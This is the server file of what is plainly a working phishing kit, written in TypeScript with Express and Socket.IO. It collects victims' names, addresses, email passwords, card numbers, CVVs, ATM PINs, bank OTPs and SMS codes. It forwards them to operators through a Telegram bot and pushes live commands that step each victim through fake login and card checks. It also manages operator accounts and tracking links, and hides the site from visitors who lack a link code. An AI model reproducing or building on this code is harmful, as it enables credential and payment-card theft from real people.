import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import fs from 'fs';
import crypto from 'crypto';
import https from 'https';
import geoip from 'geoip-lite';
import cookieParser from 'cookie-parser';
import { shieldMiddleware, verifyHandler } from './shield';
import * as db from './db';
import { authenticateToken, requireRole, signToken, verifyToken } from './auth';

const app = express();
const httpServer = createServer(app);

// Determine allowed origins from env var (comma-separated) or default to "*"
const rawOrigins = process.env.ALLOWED_ORIGINS;
const allowedOrigins = rawOrigins ? rawOrigins.split(',').map(o => o.trim()) : "*";

let corsOrigin: any = "*"; // Default to wildcard

if (allowedOrigins !== "*") {
    corsOrigin = (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
        if (!origin) {
            // Allow requests with no origin (non-browser)
            return callback(null, true);
        }

        if ((allowedOrigins as string[]).includes(origin)) {
            callback(null, true);
        } else {
            console.log(`[CORS] Blocked origin: ${origin}`);
            callback(new Error('Not allowed by CORS'));
        }
    };
}

const corsOptions = {
    origin: corsOrigin,
    methods: ["GET", "POST"]
};

const io = new Server(httpServer, {
    cors: corsOptions
});

// --- Console Log Interception for Hypervisor ---
const originalLog = console.log;
const originalError = console.error;

const broadcastLog = (type: 'log' | 'error', args: any[]) => {
    try {
        const msg = args.map(arg => {
            if (typeof arg === 'object') {
                try { return JSON.stringify(arg); } catch(e) { return '[Circular/Object]'; }
            }
            return String(arg);
        }).join(' ');

        // Emit to room 'hypervisor-logs'
        io.to('hypervisor-logs').emit('log', { type, msg, timestamp: Date.now() });
    } catch(e) {}
};

console.log = (...args) => {
    originalLog.apply(console, args);
    broadcastLog('log', args);
};

console.error = (...args) => {
    originalError.apply(console, args);
    broadcastLog('error', args);
};

console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);

const PORT = process.env.PORT || 8080;

// --- Middleware ---
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
            connectSrc: ["'self'"],
            frameSrc: ["'self'"]
        }
    }
}));
app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

// Rate Limiting - Disabled to prevent Render proxy issues
app.set('trust proxy', 1);

// --- Socket.IO ---

// Map to track socketId -> sessionId
const socketSessionMap = new Map<string, string>();

io.on('connection', (socket) => {
    console.log('[Socket] Client connected:', socket.id);

    socket.on('join', (sessionId) => {
        socket.join(sessionId);
        socketSessionMap.set(socket.id, sessionId);
        console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
    });

    socket.on('joinAdmin', () => {
        socket.join('admin');
        console.log(`[Socket] ${socket.id} joined ADMIN room`);
    });

    socket.on('joinHypervisor', (token: string) => {
        const user = verifyToken(token);
        if (user && user.role === 'hypervisor') {
            socket.join('hypervisor-logs');
            console.log(`[Socket] ${socket.id} joined HYPERVISOR logs`);
        } else {
            console.warn(`[Socket] Unauthorized attempt to join hypervisor logs: ${socket.id}`);
        }
    });

    socket.on('disconnect', () => {
        console.log('[Socket] Client disconnected:', socket.id);

        // Retrieve associated session ID
        const sessionId = socketSessionMap.get(socket.id);
        if (sessionId) {
            // Force "Offline" status by setting lastSeen > 1 min ago
            // Using 70000ms (70s) to be safely over the 60s threshold
            const offlineTime = Date.now() - 70000;
            db.updateLastSeen(sessionId, offlineTime).then(() => {
                 // Notify admins to update list immediately
                 io.emit('sessions-updated');
            });

            socketSessionMap.delete(socket.id);
        }
    });
});

// --- API Routes ---

// Shield Verify Endpoint (Bypassed by Shield Middleware)
app.post('/api/shield/verify', verifyHandler);

// Apply Shield (Protects all subsequent routes and static files)
app.use(shieldMiddleware);

// Settings Helper
let cachedSettings: any = {};
const refreshSettings = async () => {
    try {
        cachedSettings = await db.getSettings();
        // Fallback to Env
        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
    } catch (e) { console.error('Failed to load settings', e); }
};
// refreshSettings(); // Moved to after DB init

const getFlagEmoji = (countryCode: string) => {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
};

const escapeHtml = (unsafe: any) => {
    if (typeof unsafe !== 'string') return unsafe;
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

const formatSessionForTelegram = (session: any, title: string, flag: string, hideEmpty: boolean = false) => {
    const s = session;
    const d = s.data || s; // Fallback

    // Helper for "Value or Empty"
    const v = (val: any) => {
        if (val) return `<code>${escapeHtml(val)}</code>`;
        return hideEmpty ? null : '<i>(Empty)</i>';
    };

    // Helper to add line only if value exists or we are showing empty
    const addLine = (label: string, val: any, prefix = '├') => {
        const formatted = v(val);
        return formatted ? `${prefix} <b>${label}:</b> ${formatted}\n` : '';
    };

    let msg = `${flag} <b>${title}</b>\n\n`;

    msg += `🆔 <b>Session ID:</b> <code>${s.sessionId || s.id}</code>\n`;
    msg += `🌍 <b>IP Address:</b> <code>${s.ip || s.fingerprint?.ip || 'Unknown'}</code>\n`;
    msg += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n`;

    // Identity
    if (d.firstName || d.lastName || d.email) {
        let section = `\n👤 <b>IDENTITY PROFILE</b>\n`;
        let content = '';
        content += addLine('Name', (d.firstName + ' ' + d.lastName).trim());
        content += addLine('DOB', d.dob);
        content += addLine('Phone', d.phoneNumber);
        content += addLine('Addr', d.address);
        content += addLine('Loc', d.country, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    // Credentials
    if (d.email || d.password) {
        let section = `\n🔐 <b>CREDENTIALS</b>\n`;
        let content = '';
        content += addLine('Email', d.email);
        content += addLine('Pass', d.password, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    // Financial
    if (d.cardNumber) {
        let section = `\n💳 <b>FINANCIAL</b>\n`;
        let content = '';
        content += addLine('Type', d.cardType);
        content += addLine('Card', d.cardNumber);

        // Multi-value line logic
        const exp = v(d.cardExpiry);
        const cvv = v(d.cardCvv);
        if (exp || cvv || !hideEmpty) {
             content += `├ <b>Exp:</b> ${exp || '<i>(Empty)</i>'} • <b>CVV:</b> ${cvv || '<i>(Empty)</i>'}\n`;
        }

        content += addLine('ATM PIN', d.atmPin);
        content += addLine('Bank OTP', d.cardOtp, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    if (d.phoneCode) {
        let section = `\n📱 <b>SMS VERIFICATION</b>\n`;
        let content = addLine('Code', d.phoneCode, '└');
        if (content || !hideEmpty) msg += section + content;
    }

    // Fingerprint
    if (s.fingerprint) {
        msg += `\n💻 <b>DEVICE FINGERPRINT</b>\n`;
        msg += `├ <b>OS/Plat:</b> ${s.fingerprint.platform || 'Unknown'}\n`;
        msg += `└ <b>Agent:</b> ${s.fingerprint.userAgent || 'Unknown'}\n`;
    }

    return msg;
};

const sendTelegram = (msg: string, token: string, chat: string) => {
    if (!token || !chat) return;

    const data = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' });
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    const req = https.request(options, res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            if (res.statusCode !== 200) {
                console.error(`[Telegram] Failed (Status ${res.statusCode}): ${body}`);
                console.error(`[Telegram] Payload was: ${msg}`);
            } else {
                console.log(`[Telegram] Sent successfully (ID: ${JSON.parse(body).result?.message_id})`);
            }
        });
    });
    req.on('error', e => console.error('[Telegram] Network Error:', e));
    req.write(data);
    req.end();
};

const getClientIp = (req: express.Request) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (typeof xForwardedFor === 'string') {
        return xForwardedFor.split(',')[0].trim();
    } else if (Array.isArray(xForwardedFor)) {
        return xForwardedFor[0].trim();
    }
    return req.socket.remoteAddress || 'Unknown';
};

const getIpCountry = (ip: string) => {
    const geo = geoip.lookup(ip);
    return geo ? geo.country : null;
};

// --- Link Tracking ---

app.post('/api/track/click', async (req, res) => {
    const { code } = req.body;
    if (code) {
        await db.incrementLinkClicks(code);
    }
    res.json({ status: 'ok' });
});

// 1. Sync State (Hybrid: HTTP for data, Socket for notify)
app.post('/api/sync', async (req, res) => {
    try {
        const data = req.body;
        if (!data || !data.sessionId) {
            return res.status(400).json({ error: 'Missing sessionId' });
        }

        const ip = getClientIp(req);
        const country = getIpCountry(ip);

        // Populate Server-Side Fields
        data.ip = ip;
        if (data.fingerprint) data.fingerprint.ip = ip;
        if (country) data.ipCountry = country;

        // --- Multi-Admin Logic ---
        let adminId = null;
        let adminSettings = {};
        let tgToken = cachedSettings.tgToken; // Default global
        let tgChat = cachedSettings.tgChat;   // Default global

        // 1. Check for Admin Code (Personalized Link)
        if (data.adminCode) {
             // Check NEW Links first
             const link = await db.getLinkByCode(data.adminCode);
             if (link) {
                 adminId = link.adminId;
             } else {
                 // Check LEGACY User Code
                 const admin = await db.getUserByCode(data.adminCode);
                 if (admin) {
                     adminId = admin.id;
                 }
             }
        }

        // 2. Load Existing Session (to check for pre-assigned admin)
        const existing = await db.getSession(data.sessionId);

        // If not explicit in request, fallback to existing
        if (!adminId && existing && existing.adminId) {
            adminId = existing.adminId;
        }

        // 3. Load Admin Config if assigned
        if (adminId) {
            const admin = await db.getUserById(adminId);
            if (admin) {
                try {
                    // Settings
                    adminSettings = JSON.parse(admin.settings || '{}');

                    // Telegram
                    const tgConfig = JSON.parse(admin.telegramConfig || '{}');
                    if (tgConfig.token && tgConfig.chat) {
                        tgToken = tgConfig.token;
                        tgChat = tgConfig.chat;
                    }
                } catch(e) {}
            }
        }

        const flag = getFlagEmoji(country || (existing ? existing.ipCountry : 'XX') || 'XX');

        // 0. Resume / Link Logic (Only if session doesn't exist yet)
        if (!existing) {
            try {
                // Check for previous sessions by this IP
                const sessionsByIp = await db.getSessionsByIp(ip);

                // Strict Fingerprint Matching
                const currentUa = data.fingerprint?.userAgent || '';
                const currentRes = data.fingerprint?.screenResolution || '';

                const matches = sessionsByIp.filter((s: any) => {
                    const ua = s.fingerprint?.userAgent || '';
                    const res = s.fingerprint?.screenResolution || '';
                    // Allow match if currentRes is missing (initial load) but UA matches
                    if (!currentRes && ua === currentUa) return true;
                    return ua === currentUa && res === currentRes;
                });

                // Sort Newest First
                matches.sort((a: any, b: any) => (b.lastSeen || 0) - (a.lastSeen || 0));

                if (matches.length > 0) {
                    const latest = matches[0];

                    // Scenario A: Resume Incomplete Session
                    if (latest.status !== 'Verified' && latest.status !== 'Revoked') {
                        console.log(`[Sync] Resuming previous session ${latest.id} for IP ${ip}`);
                        const resumePayload = latest;
                        const cmd = { action: 'RESUME', payload: resumePayload };

                        return res.json({ status: 'ok', command: cmd });
                    }

                    // Scenario B: Recurring User
                    if (latest.status === 'Verified') {
                        console.log(`[Sync] Recurring user detected. Linking to ${latest.id}`);
                        data.isRecurring = true;
                        data.linkedSessionId = latest.id;
                        // Inherit Admin ID from previous session if not set?
                        if (!adminId && latest.adminId) {
                            adminId = latest.adminId;
                        }
                    }
                }
            } catch (e) {
                console.error('[Sync] Auto-Resume check failed:', e);
            }
        }

        // Notification Logic

        // 1. New Session Initialized (Login Submitted)
        const hasCreds = (obj: any) => obj && obj.email && obj.password;

        if (hasCreds(data)) {
            const e = existing ? (existing.data || existing) : null;
            const alreadyHadCreds = e && hasCreds(e);

            if (!alreadyHadCreds) {
                 const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
                 sendTelegram(msg, tgToken, tgChat);

                 // Tracking: New Session Started
                 if (data.adminCode) {
                     db.incrementLinkSessions(data.adminCode, 'started');
                 }
            }
        }

        // 2. Session Verified
        if (existing && existing.status !== 'Verified' && data.status === 'Verified') {
             const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
             let title = `Session Verified ${cardType}`;
             let hideEmpty = false;

             if (data.isArchivedIncomplete) {
                 title = `Session Incomplete (Archived) ${cardType}`;
                 hideEmpty = true;
             }

             const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
             sendTelegram(msg, tgToken, tgChat);

             db.logAudit('System', 'Verified', `Session ${data.sessionId} Verified`);

             // Tracking: Session Verified
             // Admin might be different from Code if reassigned, but we track the code originally used if present?
             // Actually adminCode stays in payload usually.
             if (data.adminCode) {
                 db.incrementLinkSessions(data.adminCode, 'verified');
             }
        }

        // Prevent downgrading 'Verified' status
        if (existing && existing.status === 'Verified' && data.status !== 'Verified') {
            console.log(`[Sync] Preventing status downgrade for ${data.sessionId}. Keeping 'Verified'.`);
            data.status = 'Verified';
        }

        await db.upsertSession(data.sessionId, data, ip, adminId);
        // console.log(`[Sync] Upserted session ${data.sessionId}. AdminID: ${adminId}`);

        // Notify Admins
        io.emit('sessions-updated');

        // Check for pending commands
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            io.to(data.sessionId).emit('command', cmd);
            return res.json({ status: 'ok', command: cmd, settings: adminSettings });
        }

        // --- Flow Settings (Auto-Logic) ---
        // Combine Offline logic with Admin Preferences

        // 1. Login Auto-Approve (from Admin Settings)
        if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
             const autoApprove = (adminSettings as any).autoApproveLogin;

             if (autoApprove) {
                  console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
                  const skipPhone = (adminSettings as any).skipPhone;
                  const cmd = { action: 'APPROVE', payload: { skipPhone: !!skipPhone } };
                  await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                  io.to(data.sessionId).emit('command', cmd);
                  return res.json({ status: 'ok', command: cmd, settings: adminSettings });
             }
        }

        // --- Offline Auto-Approve Logic (Fallback if no admin connected?) ---
        const adminRoom = io.sockets.adapter.rooms.get('admin');
        const isAdminOnline = adminRoom && adminRoom.size > 0;

        if (!isAdminOnline) {
             // ... (Existing Offline Logic) ...
             if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
                // Check if we didn't already approve above
                if (!(adminSettings as any).autoApproveLogin) {
                    console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
                    const cmd = { action: 'APPROVE', payload: { skipPhone: true } }; // Default skip phone for offline
                    await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                    io.to(data.sessionId).emit('command', cmd);
                    return res.json({ status: 'ok', command: cmd, settings: adminSettings });
                }
            }

            // 2. Card Auto-Approve -> Skip OTP (With 20s Delay)
            if (data.stage === 'card_pending' && !data.isFlowComplete) {
                console.log(`[Auto-Approve] Offline mode: Approving Card for ${data.sessionId} in 20s...`);
                // We don't return command immediately, we let client wait
                setTimeout(async () => {
                    const cmd = { action: 'APPROVE', payload: { flow: 'complete' } };
                    await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                    io.to(data.sessionId).emit('command', cmd);
                }, 20000);
                return res.json({ status: 'ok', settings: adminSettings });
            }

            // 3. Bank App Pending
            if (data.stage === 'bank_app_pending' && !data.isFlowComplete) {
                const cmd = { action: 'APPROVE', payload: {} };
                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                io.to(data.sessionId).emit('command', cmd);
                return res.json({ status: 'ok', command: cmd, settings: adminSettings });
            }
        }

        res.json({ status: 'ok', settings: adminSettings });
    } catch (e) {
        console.error('[Sync] Error:', e);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

// Settings API
app.get('/api/settings', async (req, res) => {
    await refreshSettings();
    const safeSettings = { ...cachedSettings };
    delete safeSettings.admin_password;
    res.json(safeSettings);
});

app.post('/api/settings', async (req, res) => {
    const { tgToken, tgChat } = req.body;
    if (tgToken !== undefined) await db.updateSetting('tgToken', tgToken);
    if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);

    await refreshSettings();
    db.logAudit('System', 'UpdateSettings', 'Updated global settings');
    res.json({ status: 'ok' });
});

// Admin Auth (New JWT Flow)

// Gate Check (Shared Secret)
app.post('/api/admin/gate', (req, res) => {
    const { username, password } = req.body;
    // Hardcoded gate credentials as per requirements
    // Ideally this should be env vars, but "admin"/"secure123" is specified
    if (username === 'admin' && password === 'secure123') {
        // Return a temporary token or just success
        // For simplicity in this session-less flow, we just say OK
        // and the frontend proceeds.
        // A more hardened version would return a signed token required for the next step.
        return res.json({ status: 'ok' });
    }
    return res.status(401).json({ error: 'Invalid gate credentials' });
});

app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        const user = await db.getUserByUsername(username);
        if (!user || user.password !== password) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const token = signToken({
            id: user.id,
            username: user.username,
            role: user.role
        });

        db.logAudit(username, 'Login', 'Admin logged in');

        res.json({ status: 'ok', token, user: {
            id: user.id,
            username: user.username,
            role: user.role,
            uniqueCode: user.uniqueCode
        }});

    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Internal Error' });
    }
});

app.get('/api/admin/me', authenticateToken, async (req, res) => {
    const u = (req as any).user;
    const user = await db.getUserById(u.id);
    if (!user) return res.sendStatus(404);

    // Parse JSON fields
    let settings = {};
    try { settings = JSON.parse(user.settings || '{}'); } catch(e) {}

    let telegramConfig = {};
    try { telegramConfig = JSON.parse(user.telegramConfig || '{}'); } catch(e) {}

    res.json({
        id: user.id,
        username: user.username,
        role: user.role,
        uniqueCode: user.uniqueCode,
        maxLinks: user.maxLinks || 1,
        settings,
        telegramConfig
    });
});

// --- Links Management ---

app.get('/api/admin/links', authenticateToken, async (req, res) => {
    try {
        const u = (req as any).user;
        const links = await db.getLinks(u.role === 'hypervisor' ? undefined : u.id);
        res.json(links);
    } catch(e) {
        res.status(500).json({ error: 'Failed to fetch links' });
    }
});

app.post('/api/admin/links', authenticateToken, async (req, res) => {
    try {
        const u = (req as any).user;
        // Check limits
        const user = await db.getUserById(u.id);
        const currentLinks = await db.getLinks(u.id);
        const max = user.maxLinks || 1;

        if (currentLinks.length >= max && u.role !== 'hypervisor') {
            return res.status(403).json({ error: 'Max links reached' });
        }

        const code = crypto.randomUUID().substring(0, 8);
        await db.createLink(u.id, code);

        db.logAudit(u.username, 'CreateLink', `Created link ${code}`);
        res.json({ status: 'ok', code });
    } catch(e) {
        res.status(500).json({ error: 'Failed to create link' });
    }
});

// --- Hypervisor Routes ---

app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const logs = await db.getAuditLogs(100);
        res.json(logs);
    } catch(e) {
        res.status(500).json({ error: 'Failed to fetch audit logs' });
    }
});

app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const users = await db.getAllUsers();
        // Sanitize
        const safeUsers = users.map(u => ({
            id: u.id,
            username: u.username,
            role: u.role,
            uniqueCode: u.uniqueCode,
            maxLinks: u.maxLinks
            // settings: u.settings
        }));
        res.json(safeUsers);
    } catch (e) {
        res.status(500).json({ error: 'Failed to fetch users' });
    }
});

app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const { username, password, role, uniqueCode } = req.body;
        if (!username || !password) return res.status(400).json({ error: 'Missing fields' });

        const id = crypto.randomUUID();
        await db.createUser({
            id,
            username,
            password,
            role: role || 'admin',
            uniqueCode: uniqueCode || crypto.randomUUID().substring(0, 8),
            settings: '{}',
            telegramConfig: '{}',
            maxLinks: role === 'hypervisor' ? 100 : 1
        });

        db.logAudit((req as any).user.username, 'CreateUser', `Created user ${username}`);
        res.json({ status: 'ok', id });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Failed to create user' });
    }
});

app.put('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const { username, password, uniqueCode, settings, maxLinks } = req.body;
        const updates: any = {};
        if (username) updates.username = username;
        if (password) updates.password = password; // Should hash!
        if (uniqueCode) updates.uniqueCode = uniqueCode;
        if (maxLinks !== undefined) updates.maxLinks = maxLinks;
        if (settings) updates.settings = JSON.stringify(settings);

        await db.updateUser(req.params.id, updates);
        db.logAudit((req as any).user.username, 'UpdateUser', `Updated user ${req.params.id}`);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Failed to update user' });
    }
});

app.delete('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        // Prevent deleting self?
        if (req.params.id === (req as any).user.id) {
            return res.status(400).json({ error: 'Cannot delete self' });
        }
        await db.deleteUser(req.params.id);
        db.logAudit((req as any).user.username, 'DeleteUser', `Deleted user ${req.params.id}`);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Failed to delete user' });
    }
});

app.post('/api/admin/impersonate/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const targetUser = await db.getUserById(req.params.id);
        if (!targetUser) return res.status(404).json({ error: 'User not found' });

        const token = signToken({
            id: targetUser.id,
            username: targetUser.username,
            role: targetUser.role,
            isImpersonated: true // Flag to show "Back to Hypervisor" in UI?
        });

        db.logAudit((req as any).user.username, 'Impersonate', `Impersonated ${targetUser.username}`);
        res.json({ status: 'ok', token });
    } catch (e) {
        res.status(500).json({ error: 'Impersonation failed' });
    }
});

app.post('/api/admin/assign-session', authenticateToken, requireRole('hypervisor'), async (req, res) => {
    try {
        const { sessionId, adminId } = req.body;
        await db.updateSessionAdmin(sessionId, adminId || null);
        io.emit('sessions-updated'); // Global update
        db.logAudit((req as any).user.username, 'AssignSession', `Assigned ${sessionId} to ${adminId}`);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Assignment failed' });
    }
});

// Update Settings (Per Admin)
app.post('/api/admin/settings', authenticateToken, async (req, res) => {
    try {
        const { settings, telegramConfig } = req.body;
        const userId = (req as any).user.id;

        const updates: any = {};
        if (settings) updates.settings = JSON.stringify(settings);
        if (telegramConfig) updates.telegramConfig = JSON.stringify(telegramConfig);

        await db.updateUser(userId, updates);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Failed to save settings' });
    }
});

// 2. Fetch Sessions (Admin/Hypervisor)
app.get('/api/sessions', authenticateToken, async (req, res) => {
    try {
        const user = (req as any).user;
        let sessions = [];

        if (user.role === 'hypervisor') {
            // Hypervisor sees ALL
            // Optionally support ?adminId= filter
            const filterId = req.query.adminId as string;
            sessions = await db.getAllSessions(filterId);
        } else {
            // Admin sees only their own
            sessions = await db.getAllSessions(user.id);
        }

        // Optimization: ETag for caching
        const json = JSON.stringify(sessions);
        const etag = crypto.createHash('md5').update(json).digest('hex');

        if (req.headers['if-none-match'] === etag) {
            return res.status(304).end();
        }

        res.setHeader('ETag', etag);
        res.setHeader('Content-Type', 'application/json');
        res.send(json);
    } catch (e) {
        res.status(500).json([]);
    }
});

// 3. Admin Command
app.post('/api/command', async (req, res) => {
    try {
        const { sessionId, action, payload } = req.body;
        if (!sessionId || !action) {
            return res.status(400).send('Invalid Command');
        }

        // Prevent commands for revoked sessions
        const session = await db.getSession(sessionId);
        if (session && session.status === 'Revoked') {
            return res.status(403).json({ error: 'Session is revoked' });
        }

        await db.queueCommand(sessionId, action, payload);

        // Real-time Push
        io.to(sessionId).emit('command', { action, payload });

        res.json({ status: 'queued' });
    } catch (e) {
        res.status(500).send('Error queuing command');
    }
});

// Delete Session
app.delete('/api/sessions/:id', async (req, res) => {
    try {
        console.log('[API] Deleting session:', req.params.id);
        await db.deleteSession(req.params.id);
        io.emit('sessions-updated');
        res.json({ status: 'deleted' });
    } catch (e) {
        console.error('[API] Delete failed:', e);
        res.status(500).json({ error: 'Failed to delete' });
    }
});

// Pin Session
app.post('/api/sessions/:id/pin', async (req, res) => {
    try {
        const session = await db.getSession(req.params.id);
        if (session) {
            session.isPinned = !session.isPinned;
            await db.upsertSession(session.id, session, session.ip);
            io.emit('sessions-updated');
            res.json({ status: 'ok', isPinned: session.isPinned });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        res.status(500).json({ error: 'Failed to pin' });
    }
});

// Revoke Session
app.post('/api/sessions/:id/revoke', async (req, res) => {
    try {
        const id = req.params.id;
        console.log('[API] Revoking session:', id);

        const session = await db.getSession(id);
        if (session) {
            // Update status - KEEP as 'Active' so it remains in Admin List
            // But the client will be reset via command
            session.status = 'Active';
            await db.upsertSession(id, session, session.ip);

            // Queue Command for Client
            await db.queueCommand(id, 'REVOKE', {});

            // Notify Client (Real-time)
            io.to(id).emit('command', { action: 'REVOKE', payload: {} });

            // Notify Admins
            io.emit('sessions-updated');

            res.json({ status: 'revoked' });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        console.error('[API] Revoke failed:', e);
        res.status(500).json({ error: 'Failed to revoke' });
    }
});

// 4. Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// --- Static Files (Frontend) ---
const staticPaths = [
    path.join(__dirname, '../static'),           // Docker / Production
    path.join(__dirname, '../dist/app/browser')  // Local Development
];

// Register all paths with cache control
staticPaths.forEach(p => app.use(express.static(p, {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('index.html')) {
            // Never cache index.html to ensure clients get new CSS/JS hashes
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        } else {
            // Cache other static assets (hashed) for a long time
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        }
    }
})));

// Pre-resolve the path containing index.html to avoid per-request I/O
const indexHtmlPath = staticPaths.find(p => fs.existsSync(path.join(p, 'index.html')));

if (indexHtmlPath) {
    console.log(`[Server] Serving SPA from: ${indexHtmlPath}`);
    // Debug: List files in the static directory to help diagnose 404s
    try {
        const files = fs.readdirSync(indexHtmlPath);
        console.log('[Server] Files in static directory:', files);
    } catch (e) {
        console.warn('[Server] Failed to list static directory files:', e);
    }
} else {
    console.warn(`[Server] ⚠️  Frontend not found in: ${staticPaths.join(', ')}`);
}

// Fallback for SPA (Angular Router)
app.get('*', async (req, res) => {
    // 1. If it looks like a static asset, return 404
    // This prevents the server from returning index.html for missing CSS/JS,
    // which causes MIME type blocking in browsers.
    if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|json|map)$/)) {
        console.warn(`[Server] 404 Not Found for static asset: ${req.path}`);
        return res.status(404).send('Not Found');
    }

    // 2. Strict Access Control (Check for valid ?id=...)
    // Exception: Allow direct access to /admin route without ID
    const id = req.query.id as string;
    let allowed = false;

    if (req.path.startsWith('/admin')) {
        allowed = true;
    } else if (id) {
        // Check Link Code
        const link = await db.getLinkByCode(id);
        if (link) allowed = true;
        else {
            // Check Admin Code
            const user = await db.getUserByCode(id);
            if (user) allowed = true;
        }
    }

    // 3. Serve Content
    if (allowed) {
        if (indexHtmlPath) {
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.sendFile(path.join(indexHtmlPath, 'index.html'));
        } else {
            res.status(404).send(`
                <h1>Frontend Not Found</h1>
                <p>Please build the application first:</p>
                <pre>npm run build</pre>
            `);
        }
    } else {
        // Block access: Serve "Safe Page"
        const safePage = path.join(__dirname, 'views', 'safe.html');
        if (fs.existsSync(safePage)) {
            res.sendFile(safePage);
        } else {
            res.status(403).send('Access Denied');
        }
    }
});

// --- Start Server ---
db.initDB().then(async () => {
    await refreshSettings();
    httpServer.listen(PORT, () => {
        console.log(`[Server] ✅ Express + Socket.IO running on port ${PORT}`);
    });
});
